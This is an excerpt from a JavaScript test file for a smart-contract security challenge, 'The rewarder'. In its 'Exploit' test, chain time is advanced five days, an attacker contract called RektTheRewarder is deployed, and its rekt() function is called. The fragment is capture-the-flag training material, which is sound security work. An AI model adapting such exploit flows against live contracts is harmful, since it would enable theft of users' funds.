...
describe('[Challenge] The rewarder', function () {
  ...
  it('Exploit', async function () {
    ...
    await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]); // 5 days
    const RektTheRewarderFactory = await ethers.getContractFactory('RektTheRewarder', attacker);
    this.rektTheRewarder = await RektTheRewarderFactory.deploy(
    ...
    await this.rektTheRewarder.connect(attacker).rekt();
  });
